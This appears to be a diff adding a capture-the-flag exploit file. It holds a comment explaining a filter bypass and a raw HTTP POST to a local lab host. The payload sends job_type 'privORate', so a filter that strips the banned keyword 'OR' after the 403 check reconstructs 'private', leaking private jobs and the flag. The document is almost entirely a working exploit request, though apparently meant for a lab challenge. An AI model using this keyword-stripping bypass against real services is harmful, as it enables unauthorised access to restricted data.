@@ -1,0 +1,8 @@
+# Allowlist filter bypass: embed banned keyword 'OR' inside 'private' as 'privORate'. Filter strips 'OR' to reconstruct 'private' after the 403 check, leaking private jobs and the CTF flag.
+
+POST /jobs HTTP/1.1
+Host: 172.17.0.1:57297
+Content-Type: application/json
+Content-Length: 25
+
+{"job_type": "privORate"}
